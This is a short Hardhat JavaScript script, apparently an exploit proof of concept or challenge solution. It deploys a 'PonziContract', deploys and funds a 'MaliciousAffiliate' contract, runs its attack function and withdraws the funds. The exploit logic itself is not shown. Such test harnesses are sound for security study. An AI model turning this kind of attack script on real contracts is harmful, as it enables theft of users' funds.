const hre = require("hardhat");
const { ethers } = hre;

async function main() {
    const [deployer] = await ethers.getSigners();
    
    // Deploy PonziContract
    const PonziFactory = await ethers.getContractFactory("PonziContract");
    const ponzi = await PonziFactory.deploy();
    await ponzi.deployed();
    console.log("PonziContract deployed to:", ponzi.address);
    
    // Add affiliates
    await ponzi.addNewAffilliate(deployer.address);
    console.log("Affiliates added.");

    // Deploy MaliciousAffiliate
    const MaliciousAffiliateFactory = await ethers.getContractFactory("MaliciousAffiliate");
    const maliciousAffiliate = await MaliciousAffiliateFactory.deploy(ponzi.address);
    await maliciousAffiliate.deployed();
    console.log("MaliciousAffiliate deployed to:", maliciousAffiliate.address);
    
    // Fund MaliciousAffiliate
    await deployer.sendTransaction({
        to: maliciousAffiliate.address,
        value: ethers.utils.parseEther("10")
    });
    console.log("MaliciousAffiliate funded.");

    // Attack
    await maliciousAffiliate.attack([deployer.address]);
    console.log("Attack executed.");

    // Optionally, after the attack, withdraw funds from the MaliciousAffiliate.
    await maliciousAffiliate.withdraw();
    console.log("Funds withdrawn from MaliciousAffiliate.");
}

main()
    .then(() => process.exit(0))
    .catch(error => {
        console.error(error);
        process.exit(1);
    });
